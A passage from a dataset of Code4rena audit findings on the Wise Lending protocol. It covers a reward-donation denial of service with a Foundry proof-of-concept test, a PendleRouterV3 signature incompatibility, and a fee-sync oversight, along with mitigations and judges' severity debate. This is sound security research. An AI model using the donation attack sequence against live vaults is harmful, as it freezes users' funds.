      "content": "\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L98-L130>\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L502-L524>\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L89-L95>\n\n### Impact\n\nRandom actors, malicious or not, can DOS the Pendle `PowerFarm` vault by sending rewards to it through `PendlePowerFarmToken::addCompoundRewards()` or `PendlePowerFarmController::exchangeRewardsForCompoundingWithIncentive()`. This results in all users being unable to access their positions or open new ones for a set amount of time imposed by `PendlePowerFarmToken::_validateSharePriceGrowth()`.\n\n### Proof of Concept\n\nThe `PendlePowerFarmToken` has a mechanism in place that protects the vault from people looping and increasing the share price:\n\n```solidity\nfunction _validateSharePriceGrowth(\n    uint256 _sharePriceNow\n)\n    private\n    view\n{\n    uint256 timeDifference = block.timestamp\n        - INITIAL_TIME_STAMP;\n\n    uint256 maximum = timeDifference\n        * RESTRICTION_FACTOR\n        + PRECISION_FACTOR_E18;\n\n    if (_sharePriceNow > maximum) {\n        revert InvalidSharePriceGrowth();\n    }\n}\n```\n\nThis is a private function invoked from the `syncSupply()` modifier, which is used for the following functions:\n\n- `manualSync()`\n- `addCompoundRewards()`\n- `depositExactAmount()`\n- `withdrawExactShares()`\n- `withdrawExactAmount()`\n\nThe entry point of this exploit is `addCompoundRewards()`:\n\n```solidity\nfunction addCompoundRewards(\n    uint256 _amount\n)\n    external\n    syncSupply\n{\n    if (_amount == 0) {\n        revert ZeroAmount();\n    }\n\n    totalLpAssetsToDistribute += _amount;\n\n    if (msg.sender == PENDLE_POWER_FARM_CONTROLLER) {\n        return;\n    }\n\n    _safeTransferFrom(\n        UNDERLYING_PENDLE_MARKET,\n        msg.sender,\n        PENDLE_POWER_FARM_CONTROLLER,\n        _amount\n    );\n}\n```\n\nWe can see that it allows users to donate their tokens to the vault to increase the `totalLpAssetsToDistribute`. This is then distributed among holders with subsequent calls to the aforementioned functions.\n\nThis is the code for the `syncSupply()` modifier:\n\n```solidity\nmodifier syncSupply()\n{\n    _triggerIndexUpdate();\n    _overWriteCheck();\n    _syncSupply();\n    _updateRewards();\n    _setLastInteraction();\n    _increaseCardinalityNext();\n    uint256 sharePriceBefore = _getSharePrice();\n    _;\n    _validateSharePriceGrowth(\n        _validateSharePrice(\n            sharePriceBefore\n        )\n    );\n}\n```\n\nThe problem here is that even though `addCompoundRewards()` calls it, the rewards added do not affect the share price immediately. It's still the previously deposited amount. So, the condition `_sharePriceNow > maximum` holds true at the time someone calls `addCompoundRewards()` but causes a revert with subsequent calls to functions dependent on the modifier until enough time passes for the condition to hold true again.\n\nCoded POC (`PendlePowerFarmControllerBase.t.sol`):\n\n```solidity\n function testDOSVault() public normalSetup(true) {\n    (IERC20 tokenReceived, uint256 balanceReceived) =\n        _getTokensToPlayWith(CRVUSD_PENDLE_28MAR_2024, crvUsdMar2024LP_WHALE);\n\n    (uint256 depositAmount, IPendlePowerFarmToken derivativeToken) =\n        _prepareDeposit(CRVUSD_PENDLE_28MAR_2024, tokenReceived, balanceReceived);\n\n    address alice = makeAddr(\"alice\");\n    address bob = makeAddr(\"bob\");\n    address charlie = makeAddr(\"charlie\");\n\n    IERC20 pendleLpToken = IERC20(CRVUSD_PENDLE_28MAR_2024);\n\n    pendleLpToken.transfer(alice, 1.3e18);\n    pendleLpToken.transfer(bob, 2e18);\n    pendleLpToken.transfer(charlie, 1e18);\n\n    vm.startPrank(alice);\n    pendleLpToken.approve(address(derivativeToken), 1.3e18);\n    derivativeToken.depositExactAmount(1.3e18);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pendleLpToken.approve(address(derivativeToken), 2e18);\n    derivativeToken.addCompoundRewards(2e18);\n    vm.stopPrank();\n\n    // DOS happens once timestamp changes\n    vm.warp(block.timestamp + 1 seconds);\n\n    // Charlie cannot deposit\n    vm.startPrank(charlie);\n    pendleLpToken.approve(address(derivativeToken), 1e18);\n    vm.expectRevert(); // InvalidSharePriceGrowth\n    derivativeToken.depositExactAmount(1 ether);\n    vm.stopPrank();\n\n    // Alice cannot withdraw\n    vm.startPrank(alice);\n    vm.expectRevert(); // InvalidSharePriceGrowth\n    derivativeToken.withdrawExactShares(1e18);\n    vm.stopPrank();\n\n    // After 8 weeks, transactions still fail since _sharePriceNow is still greater than maximum (look at PendlePowerFarmToken::__validateSharePriceGrowth())\n    vm.warp(block.timestamp + 8 weeks);\n\n    // Alice still cannot withdraw\n    vm.startPrank(alice);\n    vm.expectRevert(); // InvalidSharePriceGrowth\n    derivativeToken.withdrawExactShares(1e18);\n    vm.stopPrank();\n\n    // From this point onwards, maximum > _sharePriceNow\n    vm.warp(block.timestamp + 9 weeks);\n\n    // Charlie can now deposit\n    vm.startPrank(charlie);\n    pendleLpToken.approve(address(derivativeToken), 1e18);\n    derivativeToken.depositExactAmount(1 ether);\n    vm.stopPrank();\n\n    // Alice can now deposit\n    vm.startPrank(alice);\n    derivativeToken.withdrawExactShares(1e18);\n    vm.stopPrank();\n}\n```\n\n### Recommended Mitigation Steps\n\nI recommend turning the deposited rewards into shares at the time of calling `addCompoundRewards()`, so we can get `_validateSharePriceGrowth()` to validate it immediately and revert on the spot if needed. This will prevent the DOS and share price growth manipulation.\n\n### Assessed type\n\nDoS\n\n**[Trust (judge) increased severity to High and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2020999197):**\n > High is reasonable for temporary freeze of funds.\n\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2022982231):**\n > > High is reasonable for temporary freeze of funds.\n> \n> That is literally definition of a Medium - temporary freeze of the funds. High is permanent freeze of funds. So dismiss the high.\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2022988055):**\n > https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\n> \n> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> \n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2023193084):**\n > This is on the upper end of temporary FoF attacks, it also lasts for an extended duration. I would rule High on much weaker versions of this finding, not even close to downgrade-worthy.\n\n**[Alex the Entreprenerd (Appellate Court judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2056798828):**\n > ### Summary of the issue\n>\n> Due to a security check on LP value growth, a donation can cause the temporary inability to withdraw from a Farm Contract\n> \n> ### Discussion\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> Facts:\n> The Dos has a cost, that grows with supply.\n> The Dos can be performed permissionlessly, at any time.\n> \n> I'm unclear as to whether this is tied to liquidation risk, which should raise the severity.\n> \n> **hickuphh3 (judge 2) commented:**\n> From what I see, it shouldn't affect liquidations or protocol health, only causing forced hodl with guaranteed returns. Hence, leaning towards Medium more than High.\n> \n> **Alex the Entreprenerd (Appellate Court lead judge) commented:**\n> Facts:\n> Information contained in the report mentions exclusively an inability to withdraw (funds stuck).\n> Other facts above still apply.\n> \n> I agree that Medium Severity seems the most appropriate because:\n> - More supply = higher cost.\n> - Dos is temporary.\n> - Unclear/Missing usage to DOS a key feature.\n> \n> **LSDan (judge 3) commented:**\n> I'm also of the opinion that Medium is more appropriate here. \n> \n>> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n>\n> Assets are not at direct risk. The minute the DOS stops the assets are once again available. Further, the cost to DOS the platform is not trivial. As you both pointed out, the more assets being frozen, the higher the cost. The attacker is donating to the users they are DOSing, leaving the user inconvenienced, but richer at the attacker's expense.\n> \n> ### Deliberation\n>\n> The severity is downgraded to Medium unanimously.\n> \n> ### Additional Context by the Lead Judge\n>\n> Had the Report shown a way to weaponize this to halt liquidations, we would have had a easier time pushing for a higher severity.\n> \n> However, given the Report only limiting itself to a temporary inability to withdraw, with no loss of principal, the decision was straightforward.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2056897212):**\n> 1. I remain convinced that a permissionless, non-theoretical temporary FoF for non-negligible length (certainly days/weeks as shown) meets High severity threshold.\n> 2. Impact breaks a core invariant which states users can always pull out their funds. Users making monetary decisions under that assumption can certainly face loss of principal (e.g. cannot pull out to repay a due-loan, etc).\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123#issuecomment-2082919302):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n*Note, this finding was downgraded to Medium by C4 staff in reference to the Appellate Court decision.*\n\n***\n\n",
      "summary": "\nThis report discusses a bug in the Pendle `PowerFarm` vault that allows malicious actors to cause a denial of service (DOS) attack. This means that users are unable to access their funds for a set amount of time. The bug is caused by a flaw in the code that protects the vault from people looping and increasing the share price. This flaw can be exploited by sending rewards to the vault through certain functions, causing the share price to increase and resulting in a DOS attack. A proof of concept is provided to demonstrate how this attack can be carried out. The recommended mitigation step is to turn the deposited rewards into shares immediately to prevent this type of attack. The severity of this bug was initially assessed as High, but was later downgraded to Medium by the Appellate Court due to the temporary nature of the attack and lack of impact on liquidations. The bug has since been mitigated by the project team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/123",
      "tags": [],
      "finders": [
        "00xSEV",
        "NentoR"
      ]
    },
    {
      "id": "32100",
      "title": "[M-11] `PendlePowerManager` is incompatible with `PendleRouterV3`",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/pendle-finance/pendle-core-v2-public/blob/main/contracts/router/ActionAddRemoveLiqV3.sol#L166-L172>\n\n<https://github.com/pendle-finance/pendle-core-v2-public/blob/main/contracts/router/ActionAddRemoveLiqV3.sol#L444-L449>\n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L467-L482> \n\n<https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L165-L171>\n\n### Impact\n\nWill cause revert when attempting to open a farm position.\n\n### Proof of Concept\n\nThe latest deployment of the Pendle router, `PendleRouterV3`, is incompatible with the `PendlePowerManager` contract. The sponsor is expecting full compatibility with both but this is not the case here. The problem stems from the calls made to `PENDLE_ROUTER.removeLiquiditySingleSy()` and `PENDLE_ROUTER.addLiquiditySingleSy()`:\n\n```solidity\nfunction _logicOpenPosition(\n    bool _isAave,\n    uint256 _nftId,\n    uint256 _depositAmount,\n    uint256 _totalDebtBalancer,\n    uint256 _allowedSpread\n)\n    internal\n{\n    // ...\n    (\n        uint256 netLpOut\n        ,\n    ) = PENDLE_ROUTER.addLiquiditySingleSy(\n        {\n            _receiver: address(this),\n            _market: address(PENDLE_MARKET),\n            _netSyIn: syReceived,\n            _minLpOut: 0,\n            _guessPtReceivedFromSy: ApproxParams(\n                {\n                    guessMin: netPtFromSwap - 100,\n                    guessMax: netPtFromSwap + 100,\n                    guessOffchain: 0,\n                    maxIteration: 50,\n                    eps: 1e15\n                }\n            )\n        }\n    );\n  // ...\n}\n\nfunction _logicClosePosition(\n    uint256 _nftId,\n    uint256 _borrowShares,\n    uint256 _lendingShares,\n    uint256 _totalDebtBalancer,\n    uint256 _allowedSpread,\n    address _caller,\n    bool _ethBack,\n    bool _isAave\n)\n    private\n{\n    // ...\n    (\n        uint256 netSyOut\n        ,\n    ) = PENDLE_ROUTER.removeLiquiditySingleSy(\n        {\n            _receiver: address(this),\n            _market: address(PENDLE_MARKET),\n            _netLpToRemove: withdrawnLpsAmount,\n            _minSyOut: 0\n        }\n    );\n  // ...\n}\n```\n\nThe issue is that the signatures of those have changed in V3:\n\n```solidity\nfunction addLiquiditySingleSy(\n    address receiver,\n    address market,\n    uint256 netSyIn,\n    uint256 minLpOut,\n    ApproxParams calldata guessPtReceivedFromSy,\n    LimitOrderData calldata limit\n) external returns (uint256 netLpOut, uint256 netSyFee);\n\nfunction removeLiquiditySingleSy(\n    address receiver,\n    address market,\n    uint256 netLpToRemove,\n    uint256 minSyOut,\n    LimitOrderData calldata limit\n) external returns (uint256 netSyOut, uint256 netSyFee);\n```\n\nThere's a new parameter called `limit` that's not accounted for in the calls in the `PendlePowerFarmLeverageLogic` helper contract. This will lead to calls always reverting with `RouterInvalidAction` due to Pendle's proxy not being able to locate the selector used.\n\nCoded POC (`PendlePowerFarmControllerBase.t.sol`):\n\n<details>\n\n```solidity\nfunction _setUpCustom(address _pendleRouter) private {\n    _setProperties();\n\n    pendleLockInstance = IPendleLock(AddressesMap[chainId].pendleLock);\n\n    wethInstance = IWETH(AddressesMap[chainId].weth);\n\n    wiseOracleHubInstance = WiseOracleHub(AddressesMap[chainId].oracleHub);\n\n    aaveHubInstance = IAaveHub(AddressesMap[chainId].aaveHub);\n\n    vm.startPrank(wiseLendingInstance.master());\n\n    controllerTester = new PendleControllerTester(\n        AddressesMap[chainId].vePendle,\n        AddressesMap[chainId].pendleTokenAddress,\n        AddressesMap[chainId].voterContract,\n        AddressesMap[chainId].voterRewardsClaimer,\n        AddressesMap[chainId].oracleHub\n    );\n\n    pendlePowerFarmTokenFactory = controllerTester.PENDLE_POWER_FARM_TOKEN_FACTORY();\n\n    PoolManager.CreatePool memory params = PoolManager.CreatePool({\n        allowBorrow: true,\n        poolToken: AddressesMap[chainId].aweth,\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 805000000000000000,\n        maxDepositAmount: 1800000000000000000000000\n    });\n\n    wiseLendingInstance.createPool(params);\n\n    IAaveHub(AddressesMap[chainId].aaveHub).setAaveTokenAddress(\n        AddressesMap[chainId].weth, AddressesMap[chainId].aweth\n    );\n\n    if (block.chainid == ETH_CHAIN_ID) {\n        wiseOracleHubInstance.addOracle(\n            AddressesMap[chainId].aweth,\n            wiseOracleHubInstance.priceFeed(AddressesMap[chainId].weth),\n            new address[](0)\n        );\n\n        wiseOracleHubInstance.recalibrate(AddressesMap[chainId].aweth);\n    }\n\n    _addPendleTokenOracle();\n\n    _addPendleMarketOracle(\n        AddressesMap[chainId].PendleMarketStEth,\n        address(wiseOracleHubInstance.priceFeed(AddressesMap[chainId].weth)),\n        AddressesMap[chainId].weth,\n        2 ether,\n        3 ether\n    );\n\n    IPendlePowerFarmToken derivativeToken =\n        _addPendleMarket(AddressesMap[chainId].PendleMarketStEth, \"name\", \"symbol\", MAX_CARDINALITY);\n\n    pendleChildLpOracleInstance = new PendleChildLpOracle(address(pendleLpOracleInstance), address(derivativeToken));\n\n    address[] memory underlyingTokens = new address[](1);\n    underlyingTokens[0] = AddressesMap[chainId].weth;\n\n    wiseOracleHubInstance.addOracle(\n        address(derivativeToken), IPriceFeed(address(pendleChildLpOracleInstance)), underlyingTokens\n    );\n\n    address[] memory underlyingTokensCurrent = new address[](0);\n\n    wiseOracleHubInstance.addOracle(CRV_TOKEN_ADDRESS, IPriceFeed(CRV_ETH_FEED), underlyingTokensCurrent);\n\n    wiseOracleHubInstance.recalibrate(CRV_TOKEN_ADDRESS);\n\n    curveUsdEthOracleInstance = new CurveUsdEthOracle(IPriceFeed(ETH_USD_FEED), IPriceFeed(CRVUSD_USD_FEED));\n\n    wiseOracleHubInstance.addOracle(\n        CRVUSD_TOKEN_ADDRESS, IPriceFeed(address(curveUsdEthOracleInstance)), new address[](0)\n    );\n\n    wiseOracleHubInstance.recalibrate(CRVUSD_TOKEN_ADDRESS);\n\n    wiseOracleHubInstance.addTwapOracle(\n        CRV_TOKEN_ADDRESS,\n        CRV_UNI_POOL_ADDRESS,\n        CRV_UNI_POOL_TOKEN0_ADDRESS,\n        CRV_UNI_POOL_TOKEN1_ADDRESS,\n        UNI_V3_FEE_CRV_UNI_POOL\n    );\n\n    wiseOracleHubInstance.addTwapOracleDerivative(\n        CRVUSD_TOKEN_ADDRESS,\n        CRVUSD_UNI_POOL_TOKEN0_ADDRESS,\n        [ETH_USDC_UNI_POOL_ADDRESS, CRVUSD_UNI_POOL_ADDRESS],\n        [ETH_USDC_UNI_POOL_TOKEN0_ADDRESS, CRVUSD_UNI_POOL_TOKEN0_ADDRESS],\n        [ETH_USDC_UNI_POOL_TOKEN1_ADDRESS, CRVUSD_UNI_POOL_TOKEN1_ADDRESS],\n        [UNI_V3_FEE_ETH_USDC_UNI_POOL, UNI_V3_FEE_CRVUSD_UNI_POOL]\n    );\n\n    address underlyingFeed = CRVUSD_TOKEN_ADDRESS;\n\n    _addPendleMarketOracle(\n        CRVUSD_PENDLE_28MAR_2024, address(curveUsdEthOracleInstance), underlyingFeed, 0.0008 ether, 0.0016 ether\n    );\n\n    derivativeToken = _addPendleMarket(CRVUSD_PENDLE_28MAR_2024, \"name\", \"symbol\", MAX_CARDINALITY);\n\n    pendleChildLpOracleInstance = new PendleChildLpOracle(address(pendleLpOracleInstance), address(derivativeToken));\n\n    underlyingTokens = new address[](1);\n    underlyingTokens[0] = underlyingFeed;\n\n    wiseOracleHubInstance.addOracle(\n        address(derivativeToken), IPriceFeed(address(pendleChildLpOracleInstance)), underlyingTokens\n    );\n\n    PoolManager.CreatePool[] memory createPoolArray = new PoolManager.CreatePool[](3);\n\n    createPoolArray[0] = PoolManager.CreatePool({\n        allowBorrow: true,\n        poolToken: CRVUSD_TOKEN_ADDRESS,\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 740000000000000000,\n        maxDepositAmount: 2000000000000000000000000\n    });\n\n    createPoolArray[1] = PoolManager.CreatePool({\n        allowBorrow: false,\n        poolToken: controllerTester.pendleChildAddress(AddressesMap[chainId].PendleMarketStEth),\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 740000000000000000,\n        maxDepositAmount: 2000000000000000000000000\n    });\n\n    createPoolArray[2] = PoolManager.CreatePool({\n        allowBorrow: false,\n        poolToken: controllerTester.pendleChildAddress(CRVUSD_PENDLE_28MAR_2024),\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 740000000000000000,\n        maxDepositAmount: 2000000000000000000000000\n    });\n\n    for (uint256 i = 0; i < createPoolArray.length; i++) {\n        wiseLendingInstance.createPool(createPoolArray[i]);\n    }\n\n    powerFarmNftsInstance = new PowerFarmNFTs(\"\", \"\");\n\n    powerFarmManagerInstance = new PendlePowerManager(\n        address(wiseLendingInstance),\n        controllerTester.pendleChildAddress(AddressesMap[chainId].PendleMarketStEth),\n        _pendleRouter,\n        AddressesMap[chainId].entryAssetPendleMarketStEth,\n        AddressesMap[chainId].PendleMarketStEthSy,\n        AddressesMap[chainId].PendleMarketStEth,\n        AddressesMap[chainId].pendleRouterStatic,\n        AddressesMap[chainId].dex,\n        950000000000000000,\n        address(powerFarmNftsInstance)\n    );\n\n    wiseLendingInstance.setVerifiedIsolationPool(address(powerFarmManagerInstance), true);\n\n    vm.stopPrank();\n\n    if (block.chainid == ETH_CHAIN_ID) {\n        address wethWhaleEthMain = 0x8EB8a3b98659Cce290402893d0123abb75E3ab28;\n\n        vm.startPrank(wethWhaleEthMain);\n\n        wethInstance.transfer(wiseLendingInstance.master(), 1000 ether);\n\n        vm.stopPrank();\n    }\n\n    vm.startPrank(wiseLendingInstance.master());\n\n    IERC20(AddressesMap[chainId].weth).approve(address(powerFarmManagerInstance), 1000000 ether);\n\n    wiseSecurityInstance = IWiseSecurity(wiseLendingInstance.WISE_SECURITY());\n\n    positionNftsInstance = IPositionNFTs(wiseLendingInstance.POSITION_NFT());\n}\n\nfunction testCompatibleWithRouter() public {\n    address pendleRouter = 0x0000000001E4ef00d069e71d6bA041b0A16F7eA0;\n    _decideChain(true);\n    _setUpCustom(pendleRouter);\n    _testFarmShouldEnterAndExitIntoToken();\n}\n\nfunction testFail_IncompatibleWithRouterV3() public {\n    address pendleRouterV3 = 0x00000000005BBB0EF59571E58418F9a4357b68A0;\n    _decideChain(true);\n    _setUpCustom(pendleRouterV3);\n    // Reverts with \"RouterInvalidAction\"\n    _testFarmShouldEnterAndExitIntoToken();\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nSupport only the latest router (V3) or add conditional checks to use the respective selector for each router version.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2021111010):**\n > By definition a codebase can never be guaranteed to be compatible with the latest version. Requesting warden to provide evidence lack of integration with V3 achieves M+ severity.\n\n**[NentoR (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2022631151):**\n > @Trust - The reason why I reported this was because the sponsor told me they expect compatibility with both. The problem is that an older version of pendle router is used here and the calls for `addLiquiditySingleSy()` and `removeLiquiditySingleSy()` are basically incompatible with the new one and will revert because of a missing parameter. To understand the rationale behind this submission, let's examine the deployed contracts:\n> \n> [Current router version](https://arbiscan.io/address/0x0000000001E4ef00d069e71d6bA041b0A16F7eA0) (taken from test files).\n>\n> [PendleRouterV3 (latest)](https://arbiscan.io/address/0x00000000005BBB0EF59571E58418F9a4357b68A0).\n> \n> Here's the code for both on Deth.net:\n> [Old router](https://arbiscan.deth.net/address/0xFc0617465474a6b1CA0E37ec4E67B3EEFf93bc63) and [New one](https://arbiscan.deth.net/address/0x00000000005BBB0EF59571E58418F9a4357b68A0).\n> \n> The functions can be found in`ActionAddRemoveLiq` and `ActionAddRemoveLiqV3`\n> \n> Old one:\n> ```solidity\n>   /// @dev swaps SY to PT, then adds liquidity\n>   function _addLiquiditySingleSy(\n>       address receiver,\n>       address market,\n>       IPYieldToken YT,\n>       uint256 netSyIn,\n>       uint256 minLpOut,\n>       ApproxParams calldata guessPtReceivedFromSy\n>   ) internal returns (uint256 netLpOut, uint256 netSyFee) {\n>       MarketState memory state = IPMarket(market).readState(address(this));\n>       // ...\n>   }\n> ```\n> \n> New one:\n>\n><details>\n>\n> ```solidity\n> function addLiquiditySingleToken(\n>     address receiver,\n>     address market,\n>     uint256 minLpOut,\n>     ApproxParams calldata guessPtReceivedFromSy,\n>     TokenInput calldata input,\n>     LimitOrderData calldata limit\n> ) external payable returns (uint256 netLpOut, uint256 netSyFee, uint256 netSyInterm) {\n>     (IStandardizedYield SY, , IPYieldToken YT) = IPMarket(market).readTokens();\n> \n>     netSyInterm = _mintSyFromToken(_entry_addLiquiditySingleSy(market, limit), address(SY), 1, input);\n> \n>     (netLpOut, netSyFee) = _addLiquiditySingleSy(\n>         receiver,\n>         market,\n>         SY,\n>         YT,\n>         netSyInterm,\n>         minLpOut,\n>         guessPtReceivedFromSy,\n>         limit\n>     );\n>     \n>     // ...\n> }\n> \n> function _addLiquiditySingleSy(\n>     address receiver,\n>     address market,\n>     IStandardizedYield SY,\n>     IPYieldToken YT,\n>     uint256 netSyIn,\n>     uint256 minLpOut,\n>     ApproxParams calldata guessPtReceivedFromSy,\n>     LimitOrderData calldata limit\n> ) internal returns (uint256 netLpOut, uint256 netSyFee) {\n>     uint256 netSyLeft = netSyIn;\n>     uint256 netPtReceived;\n> \n>     if (!_isEmptyLimit(limit)) {\n>         (netSyLeft, netPtReceived, netSyFee, ) = _fillLimit(market, SY, netSyLeft, limit);\n>         _transferOut(address(SY), market, netSyLeft);\n>     }\n> \n>     (uint256 netPtOutMarket, , ) = _readMarket(market).approxSwapSyToAddLiquidity(\n>         YT.newIndex(),\n>         netSyLeft,\n>         netPtReceived,\n>         block.timestamp,\n>         guessPtReceivedFromSy\n>     );\n>     \n>     // ...\n> }\n> ```\n> \n> `_readMarket()` comes from `ActionBase`, here's it's definition:\n> ```solidity\n>  function _readMarket(address market) internal view returns (MarketState memory) {\n>       return IPMarket(market).readState(address(this));\n>   }\n> ```\n> You can see that both call `readState()` from the underlying Pendle market. Here you can find all market deployments: https://docs.pendle.finance/Developers/Deployments/Arbitrum#markets\n> \n> I'll use the first one for the example.\n> Arbiscan: https://arbiscan.io/address/0x7D49E5Adc0EAAD9C027857767638613253eF125f\n> Deth.net: https://arbiscan.deth.net/address/0x7D49E5Adc0EAAD9C027857767638613253eF125f\n> \n> If you look at the definion of `readState()`, you'll see the following:\n> ```solidity\n> function readState(address router) public view returns (MarketState memory market) {\n>     market.totalPt = _storage.totalPt;\n>     market.totalSy = _storage.totalSy;\n>     market.totalLp = totalSupply().Int();\n> \n>     (market.treasury, market.lnFeeRateRoot, market.reserveFeePercent) = IPMarketFactory(\n>         factory\n>     ).getMarketConfig(router);\n> \n>     market.scalarRoot = scalarRoot;\n>     market.expiry = expiry;\n> \n>     market.lastLnImpliedRate = _storage.lastLnImpliedRate;\n> }\n> ```\n>\n></details>\n>\n> `readState()` on all markets reaches out to the factory contract it was deployed with to grab the market configuration. And there are two versions: `MarketFactory` and `MarketFactoryV3`. Again, both can be found in the docs but here are the links:\n> \n> [MarketFactory](https://arbiscan.io/address/0xf5a7De2D276dbda3EEf1b62A9E718EFf4d29dDC8) and [MarketFactory V3]( https://arbiscan.io/address/0x2FCb47B58350cD377f94d3821e7373Df60bD9Ced).\n> \n> You can take a market from the docs and query `Market::isValidMarket()`. Using the first one, the old factory will return true whereas the new one, false.\n> \n> So basically what this all means is that the protocol won't be able to use new markets. Pendle can start phasing out the old ones and migrating them over. The fix is rather easy on the protocol's end, they just need to account for the newly added parameter and can support both, if they wish, using a conditional check.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2022744919):**\n > @vonMangoldt - can you confirm the warden's claims around your intentions?\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2026828110):**\n > Without sponsor's take the warden's claim that V3 should be compatible with the design is accepted.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133#issuecomment-2082918149):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
      "summary": "The bug report discusses an incompatibility issue between the PendleRouterV3 contract and the PendlePowerManager contract. This issue causes a revert when attempting to open a farm position. The problem stems from changes in the function signatures of the `addLiquiditySingleSy` and `removeLiquiditySingleSy` functions in the PendleRouterV3 contract. This change was not accounted for in the calls made to these functions in the PendlePowerFarmLeverageLogic contract, leading to a revert. The impact of this bug is that the protocol cannot use new markets, and the suggested fix is to account for the newly added parameter in the function calls. The sponsor has confirmed that they will address this issue in their code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Wise Lending",
      "source_link": "https://code4rena.com/reports/2024-02-wise-lending",
      "github_link": "https://github.com/code-423n4/2024-02-wise-lending-findings/issues/133",
      "tags": [],
      "finders": [
        "NentoR"
      ]
    },
    {
      "id": "32099",
      "title": "[M-10] Lack of update when modifying pool fee",
      "impact": "MEDIUM",
      "content": "\nThe `FeeManager` contract allows the master address to modify the pool fee. This can be done to a single pool using the [`setPoolFee`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L108) function or multiple pools at once using the [`setPoolFeeBulk`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L135) function. This fee is used in the the [`syncPool`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L97) modifier, specifically the [`_updatePseudoTotalAmounts`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L500) function which updates the interest amounts of the borrow and lending pools.\n\n```solidity\n\n    function setPoolFee(\n        address _poolToken,\n        uint256 _newFee\n    )\n        external\n        onlyMaster\n    {\n        _checkValue(\n            _newFee\n        );\n\n        WISE_LENDING.setPoolFee(\n            _poolToken,\n            _newFee\n        );\n\n        emit PoolFeeChanged(\n            _poolToken,\n            _newFee,\n            block.timestamp\n        );\n    }\n```\n\nThe issue is that the `setPoolFee` function modifies the pool fee without invoking the `syncPool` modifier beforehand. Consequently, the next sync operation incorrectly applies the updated pool fee to the period between the previous call and the change in the pool fee. Although the impact of changing the fee for a single pool may be minimal, using the `setPoolFeeBulk` function to alter fees for multiple pools could have a bigger impact.\n\n### Impact\n\nDepending on whether the pool fee is increased or decreased, the protocol or its users may end up paying additional fees or receiving reduced fees.\n\nLikelihood: Low. This situation arises solely in instances where there is a change in the pool fee.\n\n### Recommendation\n\nAdd the following code to update fees accurately before implementing changes:\n\n```solidity\n    function setPoolFee(\n        address _poolToken,\n        uint256 _newFee\n    )\n        external\n        onlyMaster\n    {\n\tWISE_LENDING.syncManually(_poolToken); //add here\n\t\t    \n        _checkValue(\n            _newFee\n        );\n\n        WISE_LENDING.setPoolFee(\n            _poolToken,\n            _newFee\n        );\n\n        emit PoolFeeChanged(\n            _poolToken,\n            _newFee,\n            block.timestamp\n        );\n    }\n```\n\n### Assessed type\n\nContext\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/160#issuecomment-2015328473):**\n > Admin can also call this manually (`syncManually`) directly on the contract after changing fee.\n\n**[Trust (judge) 